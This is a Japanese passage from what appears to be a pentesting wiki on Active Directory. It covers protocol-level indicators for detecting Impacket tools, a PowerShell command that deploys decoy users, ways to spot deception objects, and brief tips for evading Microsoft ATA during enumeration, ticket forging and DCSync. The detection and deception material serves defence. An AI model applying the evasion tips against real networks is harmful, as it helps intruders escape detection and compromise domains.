一般的なADの攻撃手法を検出する場合、名前を変更できるバイナリ、サービス名、一時的なバッチファイル、出力パスなど、**攻撃者が制御できる痕跡だけに頼らないでください**。正規のWindowsクライアントが[Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMIのトラフィックをどのように生成するかベースラインを作成し、攻撃者が`psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py`を編集しても残る**実装上の癖**を探してください。<sup>[[8]](#references)</sup>

- **単独でも信頼度の高い候補**（独自のベースラインとの照合後）:
  - `auth_context_id = 79231 + ctx_id`を使用する認証済みDCE/RPC
  - 認証パディングが`0xff`で埋められたDCE/RPC
  - SPNEGOの`mechToken`にraw Kerberos `AP-REQ`を直接格納するLDAP Kerberos bind
  - ASCII文字列のような`ClientGuid`を持つSMB2/3 negotiateリクエスト
  - 非標準のnamespace `//./root/cimv2`を使用するWMI `IWbemLevel1Login::NTLMLogin`
  - ハードコードされたKerberos nonce値
- **相関やスコアリングの特徴として使うのがより適切なもの**:
  - 疎な、または重複したKerberos etypeリスト、通常と異なる/欠落した`PA-DATA`、またはネイティブWindowsと異なるTGS-REQ etypeの順序
  - バージョン情報のないNTLM Type 1メッセージ、またはホスト名がnullのType 3メッセージ
  - SPNEGOではなくDCE/RPCで運ばれるraw NTLMSSP、欠落したDCE/RPC verification trailer、またはSPNEGO/Kerberos OIDの不一致
  - 同じホスト/ユーザー/セッション/時間帯にこれらの特徴が複数見られる場合、弱い特徴が単独で見られる場合よりはるかに強い証拠になります
- **単独のアラートではなく、補足情報として使用**:
  - デフォルトのファイル名、出力パス、ランダムなサービス名、一時的なバッチ名、デフォルトのコンピューターアカウント名、ツール固有のHTTP/WebDAV/RDP/MSSQL文字列
  - これらは攻撃者が簡単に変更できるため、複数プロトコルにまたがる不審なクラスタの説明に使うのが最適です
- **運用上の注意**:
  - これらのシグナルの検出には、復号されたトラフィック、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、またはサービス側の可視性が必要な場合があります
  - アラートに採用する前に、Samba/Linuxクライアント、アプライアンス、レガシーソフトウェアで検証してください
  - ベースラインへの確信が高まるにつれて、検出を補足情報 -> ハンティング -> アラートへと段階的に移行してください

### **Deception techniquesの実装**

- Deceptionの実装では、パスワードが無期限に有効なユーザーや、Trusted for Delegationに設定されたユーザーなど、おとりとなるユーザーやコンピューターを用意して罠を仕掛けます。具体的には、特定の権限を持つユーザーを作成したり、特権の高いグループに追加したりします。<sup>[[2]](#references)</sup>
- 実用例として、次のようなツールを使用できます: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniquesの展開について詳しくは、[GitHubのDeploy-Deception](https://github.com/samratashok/Deploy-Deception)を参照してください。

### **Deceptionの特定**

- **ユーザーオブジェクトの場合**: 不審な兆候には、通常とは異なるObjectSID、ログオン頻度の低さ、作成日、bad passwordカウントの低さがあります。
- **一般的な兆候**: おとりである可能性があるオブジェクトの属性を正規のオブジェクトと比較すると、不整合を発見できます。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)などのツールは、こうしたDeceptionの特定に役立ちます。

### **検出システムの回避**

- **Microsoft ATAの検出回避**:
  - **ユーザー列挙**: ATAによる検出を防ぐため、Domain Controller上でのセッション列挙を避けます。
  - **チケットの偽装**: チケット作成に**aes**キーを使用すると、NTLMへのダウングレードを避けて検出を回避できます。
  - **DCSync攻撃**: ATAによる検出を避けるため、Domain Controller以外から実行することを推奨します。Domain Controllerから直接実行するとアラートが発生します。

## References

- [1] [ドメイン信頼を攻撃するためのガイド](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active DirectoryにおけるDeceptionのための信頼関係の偽造](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain AdminからEnterprise Adminへ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitationのためのメモリ内LDAP toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM hashをwordlistとしてweaponizeする](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF（NetExec AD Lab）– Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacketの解析](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon経由でActive Directoryアカウントを乗っ取る](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472に関連するNetlogonセキュアチャネル接続の変更を管理する方法](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [忘れられたNull SessionとMS-RPCインターフェイスを探る](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [ドメイン間のセキュリティ境界としてのSID filter？（Part 4）- SID filtering回避の調査](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [ドメイン間のセキュリティ境界としてのSID filter？（Part 5）- Golden GMSA trust attack - childからparentへ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [ドメイン間のセキュリティ境界としてのSID filter？（Part 6）- Schema change trust attack - childからparentへ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5を使ってDAからEAへ](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CSの悪用によりchild domainの管理者からenterprise adminへ5分で昇格する方法、その続編](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [袖の中のACE: Active Directory DACLバックドアの設計](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k moduleのソース](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
